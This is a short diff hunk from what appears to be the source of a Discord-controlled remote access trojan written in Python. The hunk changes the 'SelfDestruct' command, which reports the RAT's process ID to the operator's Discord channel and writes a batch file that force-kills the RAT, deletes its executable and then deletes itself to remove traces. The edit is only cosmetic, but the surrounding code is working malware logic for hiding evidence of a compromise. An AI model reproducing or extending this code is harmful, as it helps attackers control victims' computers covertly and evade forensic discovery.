@@ -979,10 +979,9 @@ async def SelfDestruct_command(ctx: SlashContext):
         cwd2 = sys.argv[0]
         rat_path = f'{cwd}\\{cwd2}.exe'
         ###### Remove temp files ######
-        data = f"Killed Rat PID: {pid}\n\nRemoved rat file!"
+        data = f"Killed Rat PID: **{pid}**\n\nRemoved rat file!"
         embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
         await ctx.send(embed=embed)
-        await ctx.send(f"```Killed Task PID: ``{pid}\n\n")
         bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
         temp6 = temp + r"\\kill.bat"
         if os.path.isfile(temp6):
